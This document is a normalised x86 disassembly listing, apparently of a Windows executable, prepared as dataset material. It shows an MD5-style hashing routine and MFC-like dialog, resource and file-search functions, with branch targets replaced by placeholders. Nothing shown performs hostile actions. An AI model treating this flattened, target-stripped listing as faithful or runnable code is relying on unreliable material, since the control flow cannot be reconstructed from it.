lea edi [ edx + edi - 0x155ed806 ]
mov edx edi
shl edi 0xb
shr edx 0x15
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x28 ]
lea edi [ esi + edi - 0x2b10cf7b ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ ecx + edi + 0x4881d05 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ eax + edi - 0x262b2fc7 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ edx + edi - 0x1924661b ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ esi + edi + 0x1fa27cf8 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
xor edi eax
add edi ebp
lea edi [ ecx + edi - 0x3b53a99b ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi edx
add ecx esi
not edi
mov ebp [ esp + 0x10 ]
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ eax + edi - 0xbd6ddbc ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x48 ]
lea edi [ edx + edi + 0x432aff97 ]
mov edx edi
shl edi 0xa
shr edx 0x16
or edx edi
mov edi ecx
not edi
add edx eax
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ esi + edi - 0x546bdc59 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi eax
add esi edx
not edi
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ ecx + edi - 0x36c5fc7 ]
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov edi edx
add ecx esi
not edi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ eax + edi + 0x655b59c3 ]
mov eax edi
shr eax 0x1a
shl edi 0x6
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ edx + edi - 0x70f3336e ]
mov edx edi
shr edx 0x16
shl edi 0xa
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
lea edi [ esi + edi - 0x100b83 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov ebp [ esp + 0x14 ]
mov edi eax
not edi
add esi edx
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x30 ]
lea edi [ ecx + edi - 0x7a7ba22f ]
mov ecx edi
shr edi 0xb
shl ecx 0x15
or ecx edi
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ eax + edi + 0x6fa87e4f ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x28 ]
lea edi [ edx + edi - 0x1d31920 ]
mov edx edi
shr edx 0x16
shl edi 0xa
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ esi + edi - 0x5cfebcec ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi eax
add esi edx
not edi
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ ecx + edi + 0x4e0811a1 ]
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov edi edx
add ecx esi
not edi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x3c ]
lea edi [ eax + edi - 0x8ac817e ]
mov eax edi
shr eax 0x1a
shl edi 0x6
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
lea edi [ edx + edi - 0x42c50dcb ]
mov edx edi
shr edx 0x16
shl edi 0xa
mov ebp [ esp + 0x18 ]
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x34 ]
lea esi [ esi + edi + 0x2ad7d2bb ]
mov edi esi
shr edi 0x11
shl esi 0xf
or edi esi
mov esi eax
add edi edx
not esi
or esi edi
xor esi edx
add esi ebp
lea ecx [ ecx + esi - 0x14792c6f ]
mov esi [ ebx ]
add esi eax
mov eax ecx
shl eax 0x15
shr ecx 0xb
mov [ ebx ] esi
mov esi [ ebx + 0x4 ]
or eax ecx
add eax esi
add eax edi
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0x8 ]
add edi eax
mov eax [ ebx + 0xc ]
mov [ ebx + 0x8 ] edi
add edx eax
pop edi
pop esi
mov [ ebx + 0xc ] edx
pop ebp
pop ebx
add esp 0x40
retn
sub_403bf1
mov ecx rw-data
jmp r-xdata
jmp r-xdata
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_403c27
mov ecx [ esp + 0x4 ]
xor edx edx
push ebx
push esi
cmp [ ecx + 0x2 ] 0xffff
mov ebx [ ecx ]
sete dl
test edx edx
je r-xdata
lea eax [ ecx + 0x12 ]
mov ebx [ ecx + 0xc ]
lea eax [ ecx + 0x1a ]
jmp r-xdata
add eax esi
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop esi
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax esi
test cx cx
je r-xdata
add eax 0x4
jmp r-xdata
mov cx [ eax ]
add eax esi
test cx cx
jne r-xdata
mov cx [ eax ]
jmp r-xdata
test bl 0x40
je r-xdata
add eax 0x3
pop esi
and al 0xfc
pop ebx
retn 0x4
neg edx
sbb edx edx
and edx esi
inc edx
lea eax [ eax + edx * 2 ]
mov cx [ eax ]
add eax esi
test cx cx
jne r-xdata
sub_403cad
cmp [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
je r-xdata
add eax 0x12
add eax 0x18
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop edx
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
movzx ecx [ eax ]
lea eax [ ecx + eax + 0x5 ]
and al 0xfc
retn 0x8
mov cx [ eax ]
jmp r-xdata
sub_403d19
mov eax sub_425d6d
call sub_40cc20
push ecx
push 0x54
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_4052f1
sub_403d50
mov eax sub_425d81
call sub_40cc20
push ecx
push 0xdc
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_405f50
sub_403d8a
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov ebx ecx
cmp [ edi + 0x2 ] 0xffff
lea eax [ edi + 0x10 ]
je r-xdata
movzx eax [ eax ]
lea eax [ eax * 4 + 0x4 ]
push eax
call sub_40bb22
mov esi [ esp + 0x14 ]
pop ecx
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ edi + 0x8 ]
pop edi
pop esi
pop ebx
retn 0x8
mov edx [ ebx ]
push eax
push edi
mov ecx ebx
call [ edx + 0x18 ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov eax edi
sub_403dd4
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call [ GlobalFree@IAT ]
pop esi
retn 0x4
push esi
call sub_40c218
pop ecx
sub_403df8
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_403c27
mov ebx eax
mov ax [ esi + 0x2 ]
mov [ ebp - 0x10 ] ebx
sub ebx esi
xor ecx ecx
cmp ax 0xffff
sete cl
cmp ax 0xffff
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x10 ]
je r-xdata
movzx eax [ eax ]
and [ ebp - 0xc ] 0x0
mov esi [ ebp - 0x10 ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
lea eax [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
xor eax eax
jmp r-xdata
mov edi eax
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ecx ] 0x7b
jne r-xdata
lea ecx [ esi + 0x12 ]
mov ecx eax
sub ecx esi
add [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push esi
call sub_403cad
cmp [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
dec edi
mov esi eax
jne r-xdata
push [ ebp - 0x8 ]
push 0x0
call [ GlobalAlloc@IAT ]
push ebx
mov esi eax
push [ ebp + 0x8 ]
mov edi esi
push esi
call sub_40ce30
add esp 0xc
add esi ebx
cmp [ edi + 0x2 ] 0xffff
mov [ ebp - 0x8 ] esi
lea eax [ edi + 0x10 ]
je r-xdata
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
lea eax [ edi + 0x8 ]
cmp [ eax ] 0x7b
jne r-xdata
lea eax [ ebx + 0x12 ]
sub esi ebx
push esi
push ebx
push [ ebp - 0x8 ]
call sub_40ce30
add [ ebp - 0x8 ] esi
add esp 0xc
cmp [ edi + 0x2 ] 0xffff
lea eax [ edi + 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
inc [ eax ]
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
lea eax [ edi + 0x8 ]
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
jne r-xdata
push [ ebp - 0x4 ]
push ebx
call sub_403cad
cmp [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0xc ] esi
lea eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
or [ eax + ecx * 4 ] 0xffffffff
mov eax edi
sub_403f37
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x14 ] edi
mov ebx ecx
je r-xdata
push 0x1
test edi edi
pop eax
je r-xdata
call sub_422d64
mov esi [ eax + 0xc ]
push 0xf0
push [ esp + 0x18 ]
push esi
call [ FindResourceA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0xc
push [ esp + 0x18 ]
mov eax [ ebx ]
mov ecx ebx
push edi
push [ esp + 0x18 ]
call [ eax + 0x1c ]
push eax
push esi
call [ LoadResource@IAT ]
test eax eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov edi eax
sub_403f92
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x14 ] ecx
push ebx
mov ecx [ ebp + 0x10 ]
xor ebx ebx
mov eax [ ecx ]
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ esi + 0x1c ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
pop ebx
leave
retn 0xc
mov ecx [ esi + 0x34 ]
cmp ecx ebx
je r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ eax + 0x2 ] 0xffff
mov [ ebp - 0x4 ] 0x1
sete dl
cmp edi ebx
mov [ ebp - 0xc ] edx
je r-xdata
mov ecx [ ebp - 0x14 ]
push esi
call sub_4040ed
push ebx
call sub_405976
cmp [ edi ] bx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
inc edi
inc edi
mov ax [ edi ]
inc edi
inc edi
mov [ ebp - 0x1c ] eax
mov edx [ edi ]
add edi 0x4
cmp ax 0x376
mov [ ebp - 0x10 ] edx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esi [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov esi [ ecx + edx * 4 ]
inc edx
cmp esi ebx
mov [ ebp + 0xc ] edx
jne r-xdata
cmp ax 0x37a
je r-xdata
cmp esi 0xffffffff
je r-xdata
lea ebx [ ecx + edx * 4 ]
cmp ax 0x377
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
push edi
push eax
push esi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_404208
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ax 0x37b
je r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
push 0x2
push [ ebp + 0x10 ]
push 0x5
push [ ebp - 0x8 ]
jmp r-xdata
cmp ax 0x378
jne r-xdata
push ebx
call [ GetParent@IAT ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
push [ esi ]
push ebx
call [ SetWindowContextHelpId@IAT ]
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0x1c ]
call [ GetWindow@IAT ]
mov esi [ ebx ]
inc [ ebp + 0xc ]
add ebx 0x4
mov [ ebp + 0x10 ] eax
test esi esi
je r-xdata
add edi [ ebp - 0x10 ]
xor ebx ebx
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
sub_4040ed
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
pop edi
leave
retn 0x4
mov eax [ eax + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ edi + 0x34 ]
mov eax [ eax + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
push esi
mov ecx [ edi + 0x34 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
add ecx 0x20
call sub_41ab2a
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ax [ eax + 0x90 ]
test ax ax
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_40a582
mov ax [ esi + 0x4 ]
test ax ax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
movzx eax ax
push eax
mov ecx edi
call sub_41f140
mov esi eax
mov ecx [ esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
push 0x1
mov [ ecx + 0x90 ] eax
mov eax [ esi + 0x38 ]
push [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8c ]
call sub_40a59f
mov esi eax
jmp r-xdata
movzx eax ax
push eax
mov ecx edi
call sub_41f140
push [ eax + 0x38 ]
mov ecx esi
call sub_40a58b
mov ecx [ edi + 0x34 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
add ecx 0x20
call sub_41ab2a
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8c ]
pop esi
test esi esi
je r-xdata
sub_404208
mov eax sub_425da9
call sub_40cc20
sub esp 0x80
push ebx
push edi
mov edi [ ebp + 0x14 ]
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
lea eax [ edi + 0x12 ]
mov [ ebp - 0x18 ] eax
je r-xdata
movsx edx [ edi + 0xa ]
movsx eax [ edi + 0xe ]
movsx ecx [ edi + 0xc ]
add eax edx
push esi
movsx esi [ edi + 0x8 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
add ecx esi
mov [ ebp - 0x40 ] esi
push [ eax + 0x1c ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] ecx
call [ MapDialogRect@IAT ]
cmp [ ebp + 0x20 ] 0x4
mov esi [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ebx
jb r-xdata
mov edx [ edi + 0x8 ]
mov ax [ eax ]
mov [ ebp - 0x64 ] edx
mov edx [ edi + 0x4 ]
mov [ ebp - 0x60 ] edx
mov dx [ edi + 0xc ]
mov [ ebp - 0x5c ] dx
mov dx [ edi + 0xe ]
mov ecx edi
mov [ ebp - 0x5a ] dx
mov dx [ edi + 0x10 ]
mov [ ebp - 0x56 ] ax
mov ax [ edi + 0x14 ]
add ecx 0x18
mov [ ebp - 0x58 ] dx
mov [ ebp - 0x54 ] ax
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x18 ] ecx
mov eax [ rw-data ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x18 ] 0x37a
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
je r-xdata
mov ebx [ esi ]
sub [ ebp + 0x20 ] 0x4
add esi 0x4
test ebx ebx
jbe r-xdata
mov eax [ esi ]
add esi 0xc
mov [ ebp - 0x2c ] eax
lea ecx [ eax - 0xc ]
cmp ecx ebx
mov [ ebp + 0x1c ] ecx
jbe r-xdata
cmp [ ebp + 0x18 ] 0x37b
jne r-xdata
xor ebx ebx
push ebx
push esi
call [ SysAllocStringLen@IAT ]
add ebx ebx
mov [ ebp + 0x10 ] eax
add esi ebx
sub [ ebp + 0x20 ] ebx
sub [ ebp + 0x20 ] eax
add [ ebp + 0x18 ] 0xfffc
mov eax [ esi ]
mov bx [ esi + 0x4 ]
sub [ ebp + 0x1c ] 0x6
add esi 0x4
inc esi
mov [ ebp - 0x28 ] eax
inc esi
cmp eax 0x80010001
jne r-xdata
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x50 ]
push ecx
push eax
cmp [ eax ] 0x7b
jne r-xdata
call [ CLSIDFromProgID@IAT ]
call [ CLSIDFromString@IAT ]
jmp r-xdata
push 0x1c
call sub_41b806
pop ecx
mov [ ebp - 0x30 ] eax
test eax eax
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ esi ]
add esi 0x4
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x10 ]
mov eax [ esi ]
add esi 0xc
push esi
mov [ ebp - 0x24 ] eax
call sub_41c49d
mov eax [ ebp - 0x10 ]
push 0xffffffef
pop ecx
mov [ ebp - 0x1c ] ebx
mov eax [ eax - 0x8 ]
sub ecx eax
add [ ebp + 0x1c ] ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
pop esi
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40523c
test eax eax
je r-xdata
push ebx
lea ecx [ ebp - 0x8c ]
push [ ebp + 0x20 ]
mov [ ebp + 0x1c ] eax
push esi
call sub_421d32
mov si [ ebp + 0x18 ]
lea eax [ ebp - 0x8c ]
sub si 0x378
mov [ ebp - 0x4 ] 0x2
neg si
sbb esi esi
mov [ ebp + 0x14 ] ebx
and esi eax
cmp [ ebp + 0x1c ] ebx
jl r-xdata
xor eax eax
push ebx
mov ecx eax
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
call sub_40a55c
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x10 ]
call [ SysFreeString@IAT ]
lea eax [ ebp + 0x14 ]
push eax
xor eax eax
cmp [ ebp + 0x18 ] 0x377
push [ ebp + 0x10 ]
sete al
push eax
push esi
movzx eax [ edi + 0x10 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x50 ]
push [ edi ]
push ebx
push eax
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x34 ]
call sub_40544a
test eax eax
je r-xdata
mov eax [ ebp - 0x2c ]
xor ebx ebx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
call sub_421d6e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax ebx
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x1c
mov ebx [ eax + 0x20 ]
mov ecx [ ebp + 0x14 ]
push 0x1
call sub_406e6d
mov eax [ ebp + 0x14 ]
push 0x13
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0xc ]
push [ eax + 0x20 ]
call [ SetWindowPos@IAT ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x8c ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x9c ]
call sub_41c44d
mov eax [ ebp + 0x14 ]
mov cx [ ebp - 0x1c ]
mov [ eax + 0x90 ] cx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x94 ] ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x98 ] ecx
sub_404541
mov eax sub_425dc7
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_40457d
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40457d
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_41b82f
and [ esi + 0x4 ] 0x0
pop ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_41b82f
and [ esi + 0x8 ] 0x0
pop ecx
pop esi
retn
cmp eax 0xffffffff
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x48 ]
and [ esi + 0xc ] 0x0
sub_4045c7
push ebp
push esi
push edi
mov esi ecx
call sub_40457d
push 0x140
call sub_41b806
mov ebp [ esp + 0x14 ]
and [ esi + 0x10 ] 0x0
test ebp ebp
pop ecx
mov [ esi + 0x8 ] eax
jne r-xdata
add eax 0x2c
push ebp
push eax
call [ lstrcpyA@IAT ]
push [ esi + 0x8 ]
push ebp
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esi + 0xc ] eax
jne r-xdata
mov ebp r--data
push ebx
mov ebx 0x104
lea ecx [ esi + 0x14 ]
push ebx
mov [ esp + 0x18 ] ecx
call sub_41c646
mov edi eax
push ebx
push ebp
push edi
call sub_40d1d7
add esp 0xc
test eax eax
pop ebx
jne r-xdata
call [ GetLastError@IAT ]
mov ecx esi
mov edi eax
call sub_40457d
push edi
jmp r-xdata
push 0x5c
push edi
call sub_40d165
push 0x2f
push edi
mov esi eax
call sub_40d165
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push 0xffffffff
call sub_41c61e
mov ecx esi
call sub_40457d
push 0x7b
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
cmp eax esi
jb r-xdata
mov esi edi
mov ecx [ esp + 0x10 ]
push 0xffffffff
call sub_41c61e
push 0x1
pop eax
mov eax edi
and [ esi ] 0x0
and [ eax ] 0x0
jmp r-xdata
sub_4046c1
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0xc ]
push 0x1
mov [ ecx ] edx
mov eax [ eax + 0x10 ]
mov [ ecx + 0x4 ] eax
pop eax
jmp r-xdata
retn 0x4
sub_4046e5
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x14 ]
push 0x1
mov [ ecx ] edx
mov eax [ eax + 0x18 ]
mov [ ecx + 0x4 ] eax
pop eax
jmp r-xdata
retn 0x4
sub_404709
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
push 0x1
mov [ ecx ] edx
mov eax [ eax + 0x8 ]
mov [ ecx + 0x4 ] eax
pop eax
jmp r-xdata
retn 0x4
sub_40472d
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0xc
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_41a4f3
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
push 0x1
mov [ ecx ] eax
pop eax
jmp r-xdata
leave
retn 0x4
sub_404758
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0x14
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_41a4f3
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
push 0x1
mov [ ecx ] eax
pop eax
jmp r-xdata
leave
retn 0x4
sub_404783
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0x4
push 0xffffffff
push eax
lea ecx [ ebp - 0x4 ]
call sub_41a4f3
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
push 0x1
mov [ ecx ] eax
pop eax
jmp r-xdata
leave
retn 0x4
sub_4047ae
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x4 ] edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ esi ]
push 0x10
call [ eax + 0x38 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x2c ] 0x2e
jne r-xdata
mov cl [ eax + 0x2d ]
test cl cl
je r-xdata
push 0x1
pop edi
cmp cl 0x2e
jne r-xdata
cmp [ eax + 0x2e ] 0x0
jne r-xdata
sub_4047e7
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
push edi
lea edi [ esi + 0x4 ]
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ edi ]
mov ecx [ esi + 0x8 ]
push eax
mov [ edi ] ecx
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
call [ FindNextFileA@IAT ]
pop edi
pop esi
retn
push 0x140
call sub_41b806
pop ecx
mov [ edi ] eax
sub_404822
mov eax sub_425dfb
call sub_40cc20
sub esp 0xc
and [ ebp - 0x18 ] 0x0
push ebx
push esi
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_41c382
mov eax [ esi ]
push 0x1
pop ebx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0x10 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_41c5b7
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_41c358
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41c0cd
mov [ ebp - 0x18 ] ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4048b6
